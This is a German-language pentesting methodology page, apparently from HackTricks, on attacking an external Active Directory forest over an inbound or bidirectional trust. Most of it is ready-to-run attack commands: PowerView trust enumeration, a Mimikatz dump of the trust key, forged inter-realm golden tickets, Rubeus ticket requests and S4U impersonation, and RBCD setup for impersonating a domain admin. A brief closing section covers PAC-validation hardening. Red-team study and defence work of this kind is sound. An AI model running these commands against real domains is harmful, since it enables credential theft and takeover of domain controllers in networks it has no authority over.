# Externe Forest-Domäne – OneWay (Inbound) oder bidirektional

{{#include ../../banners/hacktricks-training.md}}

In diesem Szenario vertraut eine externe Domäne dir (oder beide vertrauen einander), sodass du eine Art Zugriff darauf erhalten kannst.

## Aufzählung

Zunächst musst du den **Trust** **enumerieren**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` ermöglichen es dir, schnell zu erkennen, ob Cross-Forest-Abuse-Pfade (RBCD, SIDHistory) voraussichtlich ohne zusätzliche Voraussetzungen funktionieren.<sup>[[2]](#references)</sup>

Bei der vorherigen Enumeration wurde festgestellt, dass sich der Benutzer **`crossuser`** in der Gruppe **`External Admins`** befindet, die über **Admin access** auf dem **DC der externen Domain** verfügt.

## Initial Access

Wenn du keinen **besonderen** Zugriff deines Benutzers in der anderen Domain finden konntest, kannst du zur AD Methodology zurückkehren und versuchen, von einem **unprivilegierten Benutzer** aus **privesc** durchzuführen (zum Beispiel mittels Kerberoasting):

Du kannst **Powerview functions** verwenden, um die **andere Domain** mit dem Parameter `-Domain` zu **enumerieren**, wie in:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Anmelden

Mit einer regulären Methode und den Zugangsdaten eines Benutzers, der Zugriff auf die externe Domäne hat, solltest du darauf zugreifen können:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Missbrauch von SID History

Du könntest [**SID History**](sid-history-injection.md) auch über einen Forest Trust hinweg missbrauchen.

Wenn ein Benutzer **von einem Forest in einen anderen migriert** wird und **SID Filtering nicht aktiviert ist**, wird es möglich, eine **SID aus dem anderen Forest hinzuzufügen**, und diese **SID** wird beim **Authentifizieren über den Trust** zum **Token des Benutzers** hinzugefügt.

> [!WARNING]
> Zur Erinnerung: Du kannst den Signing Key mit
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Du könntest mit dem **vertrauenswürdigen** Schlüssel ein **TGT unter Identität** des Benutzers der aktuellen Domäne **signieren**.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Vollständige Benutzer-Impersonation
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD, wenn du ein Computerkonto im trusting forest kontrollierst (kein SID filtering / selective auth)

Wenn dein foreign principal (FSP) dich in eine Gruppe bringt, die Computerobjekte im trusting forest schreiben kann (z. B. `Account Operators`, eine benutzerdefinierte provisioning group), kannst du **Resource-Based Constrained Delegation** auf einem Zielhost dieses Forests konfigurieren und dich dort als beliebiger Benutzer ausgeben:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Dies funktioniert nur, wenn **SelectiveAuthentication deaktiviert** ist und **SID filtering** Ihre kontrollierende SID nicht entfernt. Dies ist ein schneller lateraler Pfad, der SIDHistory forging vermeidet und bei Trust-Überprüfungen oft übersehen wird.<sup>[[2]](#references)</sup>

### Härtung der PAC-Validierung

Updates zur PAC-Signaturvalidierung für **CVE-2024-26248**/**CVE-2024-29056** führen eine Signaturdurchsetzung für inter-forest Tickets ein. Im **Compatibility mode** können gefälschte Inter-Realm-PAC-/SIDHistory-/S4U-Pfade auf ungepatchten DCs weiterhin funktionieren. Im **Enforcement mode** werden nicht signierte oder manipulierte PAC-Daten, die einen Forest Trust überqueren, abgewiesen, sofern Sie nicht auch über den Trust-Schlüssel des Ziel-Forests verfügen. Registry-Overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) können dies abschwächen, solange sie verfügbar bleiben.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – Änderungen an der PAC-Validierung für CVE-2024-26248 und CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC-Spezifikation – Details zu SID filtering und Claims transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
